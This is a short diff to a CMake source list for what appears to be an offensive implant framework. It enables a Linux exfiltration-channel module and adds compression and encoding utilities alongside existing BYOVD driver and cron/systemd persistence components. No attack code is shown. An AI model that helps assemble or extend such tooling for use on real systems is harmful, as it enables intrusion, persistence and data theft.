@@ -35,6 +35,12 @@ set(RUNTIME_SOURCES
     byovd/byovd_manifest.c
     byovd/byovd_modular.c
 
+    # Compression utilities
+    compression/compression.c
+
+    # Encoding utilities
+    common/encoding.c
+
     # Forensic analysis APIs
     forensics/forensic_api_impl.c
     forensics/forensic_engine.c
@@ -96,8 +102,7 @@ set(RUNTIME_SOURCES
     linux/persistence/cron_systemd.c
 
     # Linux exfiltration
-    # TODO: linux/exfil/exfil_channels.c - requires libcurl dev package
-    #       Integration: add find_package(CURL) and link CURL::libcurl
+    linux/exfil/exfil_channels.c
 
     # Linux I/O
     linux/io/io_core.c
